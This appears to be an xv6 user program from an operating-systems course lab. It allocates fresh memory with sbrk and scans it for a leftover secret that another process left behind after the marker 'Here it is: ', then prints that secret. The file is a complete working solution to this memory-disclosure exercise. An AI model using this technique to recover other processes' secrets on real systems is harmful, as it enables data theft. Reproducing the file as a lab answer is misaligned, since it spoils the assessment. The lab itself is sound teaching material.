#include "kernel/types.h"
#include "user/user.h"

int
main(int argc, char *argv[])
{
  int size = 32 * 4096;
  char *data = sbrk(size);
  if (data == SBRK_ERROR) {
    fprintf(2, "attack: allocation failed\n");
    exit(1);
  }

  char *marker = "Here it is: ";
  int length = strlen(marker);
  for (int i = 0; i + length < size; i++) {
    if (memcmp(data + i, marker, length) != 0)
      continue;
    int start = i + length;
    int end = start;
    while (end < size &&
           ((data[end] >= '0' && data[end] <= '9') ||
            (data[end] >= 'a' && data[end] <= 'z') ||
            (data[end] >= 'A' && data[end] <= 'Z')))
      end++;
    if (end > start && end < size && data[end] == '\0') {
      printf("%s\n", data + start);
      exit(0);
    }
  }
  exit(1);
}